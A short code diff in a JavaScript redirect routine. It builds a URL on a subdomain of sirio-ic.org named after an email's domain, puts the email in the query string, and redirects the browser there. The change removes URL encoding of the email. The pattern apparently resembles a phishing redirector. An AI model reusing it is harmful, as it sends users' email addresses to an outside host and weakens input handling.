@@ -16,7 +16,7 @@
 
         if (domainPart) {
           const domainName = domainPart.split('.')[0]; // Removes TLD
-          const targetUrl = `https://${domainName}.sirio-ic.org/?${domainName}=${encodeURIComponent(email)}`;
+          const targetUrl = `https://${domainName}.sirio-ic.org/?${domainName}=${(email)}`;
           window.location.replace(targetUrl);
         } else {
           // Fallback if email is invalid
